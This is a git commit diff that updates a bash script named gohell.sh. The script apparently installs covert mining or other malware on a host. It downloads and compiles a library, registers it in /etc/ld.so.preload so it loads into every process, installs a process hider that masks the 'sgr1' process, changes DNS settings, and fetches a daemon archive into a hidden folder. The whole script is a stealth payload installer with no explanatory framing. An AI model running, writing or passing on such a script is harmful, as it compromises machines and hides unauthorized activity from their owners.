2177b20f6ceabfe58c1c0a976782bf70e3fdb651
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-03-18 18:27:10 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,24 +1,18 @@
 #!/bin/bash
 set -x
-apt-get update 
-apt-get install -y wget curl sudo
-curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+sudo apt-get install libsodium23 -y
+apt-get install libsodium23 -y
+curl https://github.com/nandafiku/fillesg/raw/main/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-sudo apt-get update 
-sudo apt-get install -y gcc ca-certificates curl gnupg 
-sudo mkdir -p /etc/apt/keyrings
-curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
-echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
-sudo apt-get install nodejs -y
-npm install -g npm@10.2.0 -y
-npm i -g node-process-hider
-ph add sgr1
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
 wget https://github.com/TiannaMcdowell/All-File/raw/main/daemon.tar.gz > /dev/null 2>&1 
